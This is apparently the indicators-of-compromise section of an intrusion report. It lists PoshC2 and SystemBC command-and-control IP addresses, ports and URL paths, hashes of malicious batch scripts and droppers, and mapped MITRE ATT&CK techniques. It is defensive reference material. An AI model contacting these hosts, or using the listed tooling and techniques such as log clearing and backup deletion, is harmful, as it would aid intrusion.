PoshC2 IP Address: 94.198.53.143 185.234.216.64 Extracted C2 URLs: /webhp/ /adsense/troubleshooter/1631343/ /trader-update/history&pd=/ /status/995598521343541248/query=/ /uasclient/0.1.34/modules/ /utag/lbg/main/prod/utag.15.js/ /GoPro5/black/2018/ /usersync/tradedesk/ /bootstrap/3.1.1/bootstrap.min.js/ /TOS/ /business/home.asp&ved=/ /web/20110920084728/ /vssf/wppo/site/bgroup/visitor/ /Philips/v902/ /bh/sync/aol/ /async/newtab/ /advanced_search/ /adServingData/PROD/TMClient/6/8736/ /vfe01s/1/vsopts.js/ /cisben/marketq/ /business/retail-business/insurance.asp/ /client_204/ /branch-locator/search.asp/ /work/embedded/search/ /babel-polyfill/6.3.14/polyfill.min.js=/ /cdba/ /putil/2018/0/11/po.html/ /qqzddddd/2018/load.php/ /types/translation/v1/articles/ /classroom/sharewidget/widget_stable.html/

SystemBC IP addresses:
94.198.55.181:4337
94.198.51.247:4337

### Computed
atera_del.bat 754e08c93369e5bfe24ca09b422affdd 591379f5d7d256e83de05207fd872acfa8e8aa5e ea7dec8fa52d2300350367691ae2fbea13dbd5bf80d6b43b05eedf197529aa77 atera_del2.bat 3c1853831958efe2cc78ea82b4fbd565 dc14cffa48dd95157fd381cb75bae1773d510c54 512beb7dfa9fdbc8be7fbf59c7bec7911296f9e36c8a3d3b95e7aef4a88bf09c backup.bat 91be6e6a8b4c2cb99db5b99d40e06978 86f599090aa2c7c1df65dccccf00e1818e72246a beb5022543a1e12e1f8f5ffe5d520e5fc9cf623aea512cfb43ea2f8c2897420c clearlog.bat f7a730acc86f1d6759249ccc579b1794 fe1fb1da6435a6d6283e993569d3fc82a67d7ac8 09f91e90a1604a633c00d6039581f552603421356cb1edb62e085b32ff01b94e cmd.cmd 5336dffb778b1e2a0b982b337652b213 bd65b5306914187f14bfffa995e7e68a8d036d0c 4106ce787cf73d7f8215311a241f0e42426301a5a2078da9e3349afade2df684 def1.bat 1393dab192ea2e2427889839a2d8fcf7 373609c0f30ee313fd0cc6c4e572452483d87244 0e626e01d3ae7840aa486468f40138284ccbd70dfe336a6b5d4008d01eb79988 defendermalwar.bat 1365640fc3c0e1824e348956172caed7 300c89889bbb5ef61f470174a6fcad73c4516779 5b43428452a867ad61554d763c8f19ca4cd8af8c31194304785e9e45f9258441 delbackup.bat a8b335886e39adf23e6aa44a00bf82dc 2de53c24663149366fca22f354aff5c0f5b348f4 6cff22a3ea7c054075b9aded5933587bf997623183539e10e426d103d604f046 disable.bat cc35c94e64830ff143b54783c9869ecf 4a8a4e6069ec4f6a4f24614eb885c57484bc9b79 fdc105ae79dff83f31777c6e047272c5b372251a3af49e20370e7ee9d1c70763 hyp.bat d1e3216cf698a58832d947d95dc4f3f8 1224f9667d7f1d3b7fba17f414d343912bec03db 08d40a402b3754e52e4e86003bffddfdccbceefd335f53591f4cf715f8d30321 LOGOFALL.bat 9a66570b7e25035ff337fa6098f59823 a65d7caf354161798d2458cfee9e4e988f0e94af 03b3c37300bf9dcfaa4594e86841b70263324dda305484fb268b27deb09f936c LOGOFALL1.bat c84e1655f0ba917cc605018e32eba9f3 7dee2a38cc2ba81cc373b50f42c8946601d177cb 3691dbb1834db4eb8ef4c195d26779b87db267a56f2ebca6c146a53fb8adb9c0 native_dropper 444d7a27ac0327ccc0cf4e75a32025c9 8441e7b6b6b9f24439e71c6b031262bc76d73c28 039bf780ae46875945344af489a590c5b7a36d458372a3173b55b3dc3559dfff NG1.bat aae5ca4d0e7f000ba5f5250caaed0a05 d08878d7dffe082a908a4bb6387b4739c1a9d3eb 7e623f907b4a4c924cd8af3bf4b8df45b6f904723cbb26ec87cfe7792388afe1 NG2.bat 1a4e569f50695f53bd2368cc322a792d 0a99bd83472444e1bfdd53385fbf2e95bb6dbab9 d97e2e5e6b23ee0f1efa7326d7ac3240a0df9770bf7c2992eec890f073c9cada ngrok.exe e2eadf60d8f25cae9b29decab461177b cecc54143cc375af1b9aed0021643b179574e592 1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386 ON.bat 8c7c782df59edd61aabbc510d7747b11 66ac6cf4bb4247daf1d09d9d4bc4e357cc39c6c8 b0056bef817408449470d3fa43e13cbc89cabdae795b1dc8cbe9905c5946f530 Posh_v2_dropper_x64.exe a5748047ebbe34d7821a2a040e4ca54e 55126d8215b771aa2f62f16e6aad9e8832824a4c 63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d py_dropper.sh 679d0dab79a98da8e20351f9f887e4f2 9442647283e52c91c2e836b19749f184936cf6c2 01ec91a3145332174eef9239f7767adaa5e3dff3a436dfb7d2f978f88ea6cd93 setup_uncnow.msi (Atera Remote Admin) c8903eb5763c670a15049d74d764188c 990f68cca516192d73ef443f51ed80813e324b0b 91d9c73b804aae60057aa93f4296d39ec32a01fe8201f9b73f979d9f9e4aea8b shadow.bat 4cf52cee2001cd10528f429fb6d9fd07 3cf331934996ec4338418b847b52d78d8a29d224 87ab1707a553557b10fa721a32f053fbb40d11de6f692e96e067d03316fe530b shadowGuru.bat 0f1290d014dfd9e66bbbed96a828f7d1 b8fc0194f6ed56e4a57c16756e506369c74c4078 2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465 VmManagedSetup.exe (SystemBC proxy malware) 7ee103ee99b95c07cc4a024e4d0fdc03 885fc76ba1261a1dcce87f183a2385b2b99afd96 cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2 WILD_PRIDE.exe (Sliver C2) 6b44d99b258c275ee7fcf230da177f3e 833a461f6d479d164b453cc9f5f51259d991b1b7 1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed z1.bat 97dc80d3844b01587d9fd6377b9ab0a7 93b717a562f2cc3fdf2355bd9d2670ba2391cc60 a668a98e57c03decf6ea76bb32f67f3f077ef2277e57f4117d44f4342977fddf z.bat fe00973fc12b3c6330abd9807dfb1d70 d2f5c890e3e1dd9b42e695586c06408b31d4ec7a 38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955

## MITRE
Accessibility Features - T1546.008 Account Access Removal - T1531 Application Layer Protocol - T1071 Asymmetric Cryptography - T1573.002 Clear Windows Event Logs - T1070.001 Deobfuscate/Decode Files or Information - T1140 Disable or Modify Tools - T1562.001 Disable Windows Event Logging - T1562.002 Encrypted Channel - T1573 Inhibit System Recovery - T1490 Modify Registry - T1112 PowerShell - T1059.001 Proxy - T1090 Python - T1059.006 Registry Run Keys / Startup Folder - T1547.001 Remote Access Software - T1219 Service Stop - T1489 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003

Internal case #AI26297 PR31059

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
